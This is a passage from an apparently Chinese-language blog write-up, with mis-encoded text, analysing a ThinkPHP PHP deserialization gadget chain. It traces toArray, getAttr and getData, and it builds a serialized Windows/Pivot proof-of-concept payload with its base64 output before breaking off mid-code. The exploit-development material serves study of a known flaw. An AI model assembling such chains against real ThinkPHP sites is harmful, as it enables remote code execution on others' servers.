class="hljs-variable">$name</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$val</span>] = <span class="hljs-literal">true</span>;<br>                &#125;<br>                <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// åˆå¹¶å…³è”æ•°æ®</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;data, <span class="hljs-variable">$this</span>-&gt;relation);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$val</span> <span class="hljs-keyword">instanceof</span> Model || <span class="hljs-variable">$val</span> <span class="hljs-keyword">instanceof</span> ModelCollection) &#123;<br>                <span class="hljs-comment">// å…³è”æ¨¡å‹å¯¹è±¡</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>])) &#123;<br>                    <span class="hljs-variable">$val</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>(<span class="hljs-variable">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]);<br>                &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>])) &#123;<br>                    <span class="hljs-variable">$val</span>-&gt;<span class="hljs-title function_ invoke__">hidden</span>(<span class="hljs-variable">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]);<br>                &#125;<br>                <span class="hljs-comment">// å…³è”æ¨¡å‹å¯¹è±¡</span><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) || <span class="hljs-literal">true</span> !== <span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &#123;<br>                    <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$val</span>-&gt;<span class="hljs-title function_ invoke__">toArray</span>();<br>                &#125;<br>            &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>])) &#123;<br>                <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>            &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$key</span>]) &amp;&amp; !<span class="hljs-variable">$hasVisible</span>) &#123;<br>                <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;append)) &#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;append <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$name</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$name</span>)) &#123;<br>                    <span class="hljs-comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span><br>                    <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelation</span>(<span class="hljs-variable">$key</span>);<br><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$relation</span>) &#123;<br>                        <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>                            <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>(<span class="hljs-variable">$name</span>);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$relation</span> ? <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$name</span>)-&gt;<span class="hljs-title function_ invoke__">toArray</span>() : [];<br>                &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$attr</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$name</span>);<br>                    <span class="hljs-comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span><br>                    <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelation</span>(<span class="hljs-variable">$key</span>);<br><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$relation</span>) &#123;<br>                        <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>                            <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>([<span class="hljs-variable">$attr</span>]);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$relation</span> ? <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">append</span>([<span class="hljs-variable">$attr</span>])-&gt;<span class="hljs-title function_ invoke__">toArray</span>() : [];<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$item</span>[<span class="hljs-variable">$name</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$item</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$item</span>;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>ä»£ç å¾ˆé•¿ï¼Œä½†å…³é”®éƒ¨åˆ†åªåœ¨åœ¨ä¸­åéƒ¨åˆ†å¤„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;append)) &#123;<br>          <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;append <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$name</span>) &#123;<br>              <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$name</span>)) &#123;<br>                  <span class="hljs-comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span><br>                  <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelation</span>(<span class="hljs-variable">$key</span>);<br><br>                  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$relation</span>) &#123;<br>                      <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>                      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>                          <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>(<span class="hljs-variable">$name</span>);<br>                      &#125;<br>                  &#125;<br><br>                  <span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$relation</span> ? <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$name</span>)-&gt;<span class="hljs-title function_ invoke__">toArray</span>() : [];<br>              &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                  <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$attr</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$name</span>);<br>                  <span class="hljs-comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span><br>                  <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelation</span>(<span class="hljs-variable">$key</span>);<br><br>                  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$relation</span>) &#123;<br>                      <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br>                      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br>                          <span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>([<span class="hljs-variable">$attr</span>]);<br>                      &#125;<br>                  &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„åˆ©ç”¨ç‚¹åœ¨äº<code>$relation-&gt;visible($name);</code>å’Œ<code> $relation-&gt;visible([$attr]);</code>,å› ä¸º<code>this-&gt;append</code>å¯æ§ï¼Œæ‰€ä»¥ç†è®ºä¸Šæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä»»æ„ä¸€ä¸ªæ¥ä½œè·³æ¿ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©äº†ç¬¬äºŒä¸ªï¼Œå³<code> $relation-&gt;visible([$attr]);</code></p><p>å¦‚æœèƒ½è¿›å…¥è¿™æ¡è¯­å¥ï¼Œç”±äº<code>this-&gt;append</code>å¯æ§ï¼Œé‚£ä¹ˆ<code>$relation</code>ä¹Ÿå°±å¯æ§ï¼Œ<code>$relation</code>æ˜¯ç”±è¯­å¥<code> $relation = $this-&gt;getAttr($key);</code>è€Œæ¥</p><p>ä¸ç®¡å…¶ä»–ï¼Œå…ˆæ“ä¸ªä¸€ä¸ªç®€å•POCè°ƒè¯•è°ƒè¯•ï¼Œæƒ³åŠæ³•è¿›å…¥è¿™æ¡è¯­å¥<code> $relation-&gt;visible([$attr]);</code>ã€‚</p><p>è¿˜è®°å¾—ä¹‹å‰æåŠï¼Œè¿™ä¸ª<code>Conversion</code>æ˜¯ä¸ª<code>trail</code>ç±»ï¼Œéœ€è¦æ‰¾ä¸€ä¸ªå®ç°æ­¤<code>trait</code>çš„ç±»ï¼Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨<code>think\model\Pivot</code>ç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Pivot</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">append</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;append = [<span class="hljs-string">&#x27;0.&#x27;</span>]; <span class="hljs-comment">//éœ€è¦appendéç©ºä»¥è¿›å…¥æœ€å¼€å§‹çš„å¤§ifæ¡ä»¶ï¼Œç„¶åéœ€è¦å…ƒç´ æœ‰ä¸€ä¸ª`.`æ¥æ»¡è¶³elseif (strpos($name, &#x27;.&#x27;))</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>\<span class="hljs-title class_">Windows</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>()));<br>&#125;<br><br><span class="hljs-comment">//TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6MTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6MjoiMC4iO319fX0</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥é¡ºåˆ©è¿›å…¥å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$relation</span>) &#123;<br><span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$key</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$relation</span>) &#123;<br><span class="hljs-variable">$relation</span>-&gt;<span class="hljs-title function_ invoke__">visible</span>([<span class="hljs-variable">$attr</span>]);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¼šåœ¨<code>$relation = $this-&gt;getAttr($key);</code>è·Ÿè¿›å»æŸ¥çœ‹<code>getAttr()</code>ï¼Œæ­¤æ—¶<code>$key=0</code>ï¼Œå³åœ¨<code>Pivot-&gt;append</code>è®¾ç½®çš„å…ƒç´ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAttr</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, &amp;<span class="hljs-variable">$item</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$notFound</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable">$value</span>    = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>(<span class="hljs-variable">$name</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">InvalidArgumentException</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$notFound</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable">$value</span>    = <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// æ£€æµ‹å±æ€§è·å–å™¨</span><br>    <span class="hljs-variable">$fieldName</span> = <span class="hljs-title class_">Loader</span>::<span class="hljs-title function_ invoke__">parseName</span>(<span class="hljs-variable">$name</span>);<br>    <span class="hljs-variable">$method</span>    = <span class="hljs-string">&#x27;get&#x27;</span> . <span class="hljs-title class_">Loader</span>::<span class="hljs-title function_ invoke__">parseName</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">1</span>) . <span class="hljs-string">&#x27;Attr&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>])) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$notFound</span> &amp;&amp; <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isRelationAttr</span>(<span class="hljs-variable">$name</span>)) &#123;<br>            <span class="hljs-variable">$modelRelation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$relation</span>();<br>            <span class="hljs-variable">$value</span>         = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationData</span>(<span class="hljs-variable">$modelRelation</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$closure</span> = <span class="hljs-variable language_">$this</span>-&gt;withAttr[<span class="hljs-variable">$fieldName</span>];<br>        <span class="hljs-variable">$value</span>   = <span class="hljs-variable">$closure</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable language_">$this</span>-&gt;data);<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$method</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$notFound</span> &amp;&amp; <span class="hljs-variable">$relation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isRelationAttr</span>(<span class="hljs-variable">$name</span>)) &#123;<br>            <span class="hljs-variable">$modelRelation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$relation</span>();<br>            <span class="hljs-variable">$value</span>         = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationData</span>(<span class="hljs-variable">$modelRelation</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$method</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable language_">$this</span>-&gt;data);<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;type[<span class="hljs-variable">$name</span>])) &#123;<br>        <span class="hljs-comment">// ç±»å‹è½¬æ¢</span><br>        <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">readTransform</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$this</span>-&gt;type[<span class="hljs-variable">$name</span>]);<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$name</span>, [<span class="hljs-variable">$this</span>-&gt;createTime, <span class="hljs-variable">$this</span>-&gt;updateTime])) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;autoWriteTimestamp) &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;autoWriteTimestamp), [<br>            <span class="hljs-string">&#x27;datetime&#x27;</span>,<br>            <span class="hljs-string">&#x27;date&#x27;</span>,<br>            <span class="hljs-string">&#x27;timestamp&#x27;</span>,<br>        ])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">formatDateTime</span>(<span class="hljs-variable">$this</span>-&gt;dateFormat, <span class="hljs-variable">$value</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">formatDateTime</span>(<span class="hljs-variable">$this</span>-&gt;dateFormat, <span class="hljs-variable">$value</span>, <span class="hljs-literal">true</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$notFound</span>) &#123;<br>        <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationAttribute</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$item</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä»£ç ä¹Ÿå¾ˆé•¿ï¼Œä½†å…³é”®åªåœ¨æœ€å‰é¢çš„<code>try</code>å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">try</span> &#123;<br>     <span class="hljs-variable">$notFound</span> = <span class="hljs-literal">false</span>;<br>      <span class="hljs-variable">$value</span>    = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>(<span class="hljs-variable">$name</span>);<br>     &#125; <br><span class="hljs-keyword">catch</span> (<span class="hljs-built_in">InvalidArgumentException</span> <span class="hljs-variable">$e</span>) &#123;<br>       <span class="hljs-variable">$notFound</span> = <span class="hljs-literal">true</span>;<br>       <span class="hljs-variable">$value</span>    = <span class="hljs-literal">null</span>;<br>     &#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>getData()</code>ï¼Œtipsï¼šæ­¤æ—¶çš„<code>$name=0</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getData</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$name</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>    <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$this</span>-&gt;data)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>    &#125;<br>    <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$this</span>-&gt;relation)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;relation[<span class="hljs-variable">$name</span>];<br>    &#125;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">&#x27;property not exists:&#x27;</span> . <span class="hljs-built_in">static</span>::<span class="hljs-variable language_">class</span> . <span class="hljs-string">&#x27;-&gt;&#x27;</span> . <span class="hljs-variable">$name</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šå‘ç°æŠ¥é”™çš„åœ°æ–¹å°±åœ¨è¿™é‡Œï¼Œè¿™é‡Œçš„ä¸‰ä¸ª<code>if</code>æ¡ä»¶éƒ½æ²¡æœ‰è¿›å»ï¼Œç¬¬ä¸€ä¸ª<code>if</code>ä¸è¿›å»æ˜¯å› ä¸ºè¿™é‡Œçš„<code>$name</code>æ˜¾ç„¶ä¸ä¸º<code>null</code>ï¼Œè€Œæˆ‘ä»¬ä¹Ÿä¸èƒ½ä½¿å¾—<code>$name</code>ä¸º<code>null</code>ï¼Œå¦åœ¨ä¼šåœ¨æ›´å‰é¢æŠ¥é”™ï¼›</p><p>æ¥ä¸‹æ¥å°±æ€è€ƒå¦‚ä½•è¿›å…¥ä¸‹é¢çš„ä¸¤ä¸ª<code>if</code>æ¡ä»¶ã€‚ä½†è¿™ä¹Ÿç®€å•ï¼Œé¡¾åæ€ä¹‰ï¼Œ<code>$this-&gt;data</code>éœ€è¦å­˜åœ¨ä¸€ä¸ªé”®ä¸º<code>$name</code>çš„æ•°ç»„ï¼Œå³<code>$name=&gt;xxxx</code>å½¢å¼ï¼Œä¿®æ”¹POCï¼Œç»§ç»­å°è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span 